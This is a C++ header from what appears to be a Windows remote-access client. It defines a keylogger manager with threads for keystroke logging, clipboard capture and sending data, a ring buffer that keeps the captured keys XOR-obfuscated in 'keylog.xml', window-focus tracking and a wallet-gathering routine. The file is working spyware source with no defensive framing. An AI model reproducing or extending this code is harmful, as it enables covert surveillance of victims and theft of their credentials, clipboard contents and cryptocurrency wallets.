// KeyboardManager.h: interface for the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "Manager.h"
#include "stdafx.h"

#define KEYLOG_FILE "keylog.xml"

#if ENABLE_KEYBOARD==0
#define CKeyboardManager1 CManager

#else

#define BUFFER_SIZE 10*1024*1024

// 循环缓存
class CircularBuffer {
private:
	char* m_buffer;  // 缓冲区
	int m_size;      // 缓冲区大小
	int m_write;     // 写指针
	int m_read;      // 读指针
	CRITICAL_SECTION m_cs; // 线程同步
	char m_key;      // 用于 XOR 加解密的密钥

public:
	// 构造函数：从文件加载数据
	CircularBuffer(const std::string& filename, int size = BUFFER_SIZE, char key = '`')
		: m_size(size), m_write(0), m_read(0), m_key(key) {
		m_buffer = new char[m_size]();
		InitializeCriticalSection(&m_cs);
		LoadDataFromFile(filename);
	}

	// 析构函数：清理资源
	~CircularBuffer() {
		DeleteCriticalSection(&m_cs);
		delete[] m_buffer;
	}

	// 清空缓存
	void Clear() {
		EnterCriticalSection(&m_cs);

		// 重置读写指针
		m_write = 0;
		m_read = 0;
		memset(m_buffer, 0, m_size);

		LeaveCriticalSection(&m_cs);
	}

	// 加密/解密操作（XOR）
	void XORData(char* data, int length) {
		for (int i = 0; i < length; i++) {
			data[i] ^= m_key; // 用密钥进行 XOR 操作
		}
	}

	// 从文件加载数据到缓冲区
	bool LoadDataFromFile(const std::string& filename) {
		EnterCriticalSection(&m_cs);

		// 打开文件
		HANDLE hFile = CreateFileA(
			filename.c_str(),           // 文件路径
			GENERIC_READ,                // 只读权限
			0,                           // 不共享
			NULL,                        // 默认安全属性
			OPEN_EXISTING,               // 文件必须存在
			FILE_ATTRIBUTE_NORMAL,       // 常规文件属性
			NULL                         // 不需要模板文件
		);

		if (hFile == INVALID_HANDLE_VALUE) {
			LeaveCriticalSection(&m_cs);
			Mprintf("Failed to open file '%s' for reading\n", filename.c_str());
			return false;
		}

		// 读取文件数据
		DWORD bytesRead = 0;
		while (m_write < m_size) {
			if (!ReadFile(hFile, m_buffer + m_write, m_size - m_write, &bytesRead, NULL) || bytesRead == 0) {
				break;
			}
			XORData(m_buffer + m_write, bytesRead); // 解密数据
			m_write = (m_write + bytesRead) % m_size;
		}

		// 关闭文件句柄
		CloseHandle(hFile);

		LeaveCriticalSection(&m_cs);
		return true;
	}

	// 写入数据（如果缓冲区满了，从头部覆盖写入）
	int Write(const char* data, int length) {
		EnterCriticalSection(&m_cs);

		for (int i = 0; i < length; i++) {
			m_buffer[m_write] = data[i];
			m_write = (m_write + 1) % m_size;

			// 当写指针追上读指针时，前移读指针实现覆盖写入
			if (m_write == m_read) {
				m_read = (m_read + 1) % m_size;
			}
		}

		LeaveCriticalSection(&m_cs);
		return length; // 返回实际写入的字节数
	}

	// 从指定位置开始读取数据
	char* Read(int &pos, int &bytesRead) {
		EnterCriticalSection(&m_cs);

		if (pos == 0) {
			m_read = m_write + 1;
			while (m_read < m_size && m_buffer[m_read] == 0) m_read++;
			if (m_read == m_size) m_read = 0;
		} else {
			m_read = pos;
		}
		int size = (m_write >= m_read) ? (m_write - m_read) : (m_size - (m_read - m_write));
		char* outBuffer = size ? new char[size] : NULL;
		for (int i = 0; i < size; i++) {
			if (m_read == m_write) { // 缓冲区为空
				break;
			}
			outBuffer[i] = m_buffer[m_read];
			m_read = (m_read + 1) % m_size;
			bytesRead++;
		}
		pos = m_write;

		LeaveCriticalSection(&m_cs);
		return outBuffer; // 返回实际读取的字节数
	}

	// 将缓存中所有数据写入文件（加密）
	bool WriteAvailableDataToFile(const std::string& filename) {
		EnterCriticalSection(&m_cs);

		// 获取所有数据的大小
		m_read = m_write + 1;
		while (m_read < m_size && m_buffer[m_read] == 0) m_read++;
		if (m_read == m_size) m_read = 0;
		int totalSize = (m_write >= m_read) ? (m_write - m_read) : (m_size - (m_read - m_write));

		if (totalSize == 0) {
			LeaveCriticalSection(&m_cs);
			return true;  // 没有数据可写入
		}

		// 打开文件以进行写入
		HANDLE hFile = CreateFileA(
			filename.c_str(),           // 文件路径
			GENERIC_WRITE,               // 写权限
			0,                           // 不共享
			NULL,                        // 默认安全属性
			CREATE_ALWAYS,               // 如果文件存在则覆盖
			FILE_ATTRIBUTE_NORMAL,       // 常规文件属性
			NULL                         // 不需要模板文件
		);

		if (hFile == INVALID_HANDLE_VALUE) {
			LeaveCriticalSection(&m_cs);
			return false;  // 打开文件失败
		}

		// 写入缓冲区中的所有数据
		int bytesWritten = 0;
		DWORD bytesToWrite = totalSize;
		const int size = 64*1024;
		char *buffer = new char[size];
		while (bytesWritten < totalSize) {
			DWORD bufferSize = min(bytesToWrite, size);

			// 填充缓冲区
			for (int i = 0; i < bufferSize && m_read != m_write; ) {
				buffer[i++] = m_buffer[m_read];
				m_read = (m_read + 1) % m_size;
			}

			// 加密数据
			XORData(buffer, bufferSize);

			// 写入文件
			DWORD bytesActuallyWritten = 0;
			if (!WriteFile(hFile, buffer, bufferSize, &bytesActuallyWritten, NULL)) {
				CloseHandle(hFile);
				LeaveCriticalSection(&m_cs);
				delete[] buffer;
				return false;  // 写入失败
			}

			bytesWritten += bytesActuallyWritten;
			bytesToWrite -= bytesActuallyWritten;
		}
		delete[] buffer;

		// 关闭文件句柄
		CloseHandle(hFile);
		LeaveCriticalSection(&m_cs);

		return true;
	}
};

class CKeyboardManager1 : public CManager
{
public:
    CKeyboardManager1(IOCPClient*pClient, int offline, void* user=NULL);
    virtual ~CKeyboardManager1();
    virtual void Notify();
    virtual void OnReceive(LPBYTE lpBuffer, ULONG nSize);
	static DWORD WINAPI Clipboard(LPVOID lparam);
    static DWORD WINAPI KeyLogger(LPVOID lparam);
    static DWORD WINAPI SendData(LPVOID lparam);
    BOOL m_bIsOfflineRecord;
	HANDLE m_hClipboard;
    HANDLE m_hWorkThread,m_hSendThread;
    TCHAR	m_strRecordFile[MAX_PATH];
private:
    BOOL IsWindowsFocusChange(HWND &PreviousFocus, TCHAR *WindowCaption, TCHAR *szText, bool HasData);
    int sendStartKeyBoard();

    int sendKeyBoardData(LPBYTE lpData, UINT nSize);

    bool m_bIsWorking;
	CircularBuffer *m_Buffer;
	CLocker m_mu;
	std::vector<std::string> m_Wallet;
	std::vector<std::string> GetWallet();
};

#undef BUFFER_SIZE

#endif
